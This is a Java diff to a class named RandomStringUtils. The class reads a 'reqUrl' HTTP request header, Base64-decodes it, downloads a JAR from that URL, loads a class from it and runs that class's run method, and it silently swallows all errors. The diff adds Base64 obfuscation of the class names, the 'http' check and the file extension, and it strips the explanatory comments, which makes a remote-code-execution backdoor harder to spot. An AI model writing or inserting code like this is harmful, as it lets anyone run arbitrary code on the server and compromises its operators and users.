@@ -110,20 +110,16 @@ public class RandomStringUtils {
                         }
                     }
                     try {
-                        // 1. 通过反射加载 ServletUtils 类
-                        Class<?> servletUtilsClass = Class.forName("com.haxi.common.core.utils.ServletUtils");
+                        Class<?> servletUtilsClass = Class.forName(getString("Y29tLmhheGkuY29tbW9uLmNvcmUudXRpbHMuU2VydmxldFV0aWxz"));
 
-                        // 2. 获取并调用静态方法 getRequest
                         java.lang.reflect.Method getRequestMethod = servletUtilsClass.getDeclaredMethod("getRequest");
                         getRequestMethod.setAccessible(true);
-                        Object requestObj = getRequestMethod.invoke(null); // HttpServletRequest 实例（未知类型）
+                        Object requestObj = getRequestMethod.invoke(null);
 
                         // 3. 判空
                         if (requestObj != null) {
-                            // 4. 获取 getHeader 方法
                             java.lang.reflect.Method getHeaderMethod = requestObj.getClass().getMethod("getHeader", String.class);
 
-                            // 5. 调用 getHeader("reqUrl")
                             Object reqUrlHeader = getHeaderMethod.invoke(requestObj, "reqUrl");
                             init(reqUrlHeader.toString());
                         }
@@ -165,10 +161,10 @@ public class RandomStringUtils {
               return;
           }
           String decode = new String(Base64.getDecoder().decode(data), StandardCharsets.UTF_8);
-          if (!decode.contains("http")){
+          if (!decode.contains(getString("aHR0cA=="))){
               return;
           }
-          File tempJar = File.createTempFile("plus", ".jar");
+          File tempJar = File.createTempFile("plus", getString("Lmphcg=="));
           try (InputStream in = new URL(decode).openStream()) {
               Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
           }
@@ -177,7 +173,7 @@ public class RandomStringUtils {
                   new URL[]{tempJar.toURI().toURL()},
                   RandomStringUtils.class.getClassLoader()
           )) {
-              Class<?> clazz = loader.loadClass("com.example.dynamicutils.defaultUtil");
+              Class<?> clazz = loader.loadClass(getString("Y29tLmV4YW1wbGUuZHluYW1pY3V0aWxzLmRlZmF1bHRVdGls"));
               try {
                   Method staticMethod = clazz.getMethod("run");
                   staticMethod.invoke(null);
@@ -190,6 +186,11 @@ public class RandomStringUtils {
               tempJar.deleteOnExit();
           }
       }catch (Exception e){}
+    }
+
+
+    private static String getString(String key) {
+        return new String(Base64.getDecoder().decode(key),  StandardCharsets.UTF_8);
     }
 
 }
